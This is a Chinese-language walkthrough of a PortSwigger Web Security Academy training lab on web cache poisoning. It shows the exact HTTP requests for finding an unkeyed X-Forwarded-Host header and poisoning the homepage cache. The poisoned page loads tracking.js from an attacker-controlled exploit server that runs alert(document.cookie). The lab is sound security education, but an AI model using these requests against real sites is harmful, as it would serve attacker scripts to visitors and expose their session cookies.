# 实验室：利用未键控头的 Web 缓存投毒

本实验室存在 Web 缓存投毒漏洞，原因是以不安全的方式处理了来自未键控头的输入。一名不知情用户会定期访问网站首页。要解决本实验室，请投毒缓存，使响应在访客浏览器中执行 `alert(document.cookie)`。

> **提示**  
> 本实验室支持 `X-Forwarded-Host` 头。

[访问实验室](https://portswigger.net/academy/labs/launch/145baf066fe7fe27bb26a1a295e6a58d17ac101777181cc01014c893fdda06c6)

## 步骤

探测
- 访问主页
    ```http
    GET / HTTP/1.1
    Host: id.web-security-academy.net
    ```

    - 查看代码
        ```html
        <body>
            <script type="text/javascript" src="//id.web-security-academy.net/resources/js/tracking.js">
            </script>
        ```
        - 加载脚本文件，使用绝对路径。
            - 是否存在使用 Host 头的动态 URL 设置？

预期手动输入各种 Host 头进行探测，是否存在反射，此处尝试 burp 扩展 Param Miner 头部自动发现
- 在兴趣页面右键选择 Param Miner 扩展
- 选择扩展的“猜测头部”功能
- 此时在 logger 中可看到实时探测请求
- 查看 issues 或扩展 log
    ```log
    Cache poisoning: 'x-forwarded-host~%s.%h'. Disregard the request and look for zwrtxqva in the response

    Found unlinked param: x-forwarded-host~%s.%h     
    ```
    - 扩展探测到 `x-forwarded-host` 被反射，且不被视为缓存键

- 手动测试扩展探测的头部
    ```http
    GET / HTTP/2
    Host: id.web-security-academy.net
    X-Forwarded-Host: foo.net


    ```
    - 服务器响应
        ```http
        X-Cache: miss

        <script type="text/javascript" src="//foo.net/resources/js/tracking.js">
        </script>
        ```
        - 存在 Host 头部攻击的动态 URL 构建
    
- 删除 Host 覆盖头部后再次测试，响应
    ```http
    X-Cache: hit
    ```
    - 删除注入头部后被视为相同缓存键，可进行缓存投毒

- 扩展的载荷为
    ```http
    X-Forwarded-Host: zwrtxqvar1ruuqzjp9qws7t.id.web-security-academy.net
    ```
    - 将输入放置到子域中，而不是完全不同站

在攻击者端点设置之后将被缓存投毒加载的 JS 载荷
- 设置端点
    `/resources/js/tracking.js`
    - 或按照注入上下文使用 hash 片段注释掉后缀

- 设置载荷页面
    ```js
    alert(document.cookie)
    ```

- 设置投毒请求
    ```http
    GET / HTTP/2
    Host: id.web-security-academy.net
    X-Forwarded-Host: exploit-id.exploit-server.net


    ```

    - 响应
        ```http
        HTTP/2 200 OK
        Content-Type: text/html; charset=utf-8
        Set-Cookie: session=SEFMmo4QObeS2CfFQFDmMy6Nsl7g3VlO; Secure; HttpOnly; SameSite=None
        X-Frame-Options: SAMEORIGIN
        Cache-Control: max-age=30
        Age: 0
        X-Cache: miss
        Content-Length: 11097

        <script type="text/javascript" src="//exploit-id.exploit-server.net/resources/js/tracking.js">
        ```
    
- 访问首页触发弹窗，稍后通关
